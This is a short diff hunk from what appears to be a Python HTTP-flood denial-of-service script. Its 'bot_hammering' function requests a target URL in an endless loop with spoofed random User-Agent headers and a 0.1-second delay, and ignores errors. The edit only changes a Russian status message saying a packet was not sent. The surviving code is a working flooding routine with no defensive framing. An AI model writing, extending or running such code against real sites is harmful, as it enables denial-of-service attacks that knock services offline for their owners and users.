@@ -90,7 +90,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print ("\0160[1m",time.ctime(time.time()),"\0160[0m \0160[1m <-- Пакет не отправлен --> \0160[0m")
+			print ("\033[160m Ошибка пакета ...\033[0m \033[160m <-- Пакет не отправлен --> \033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
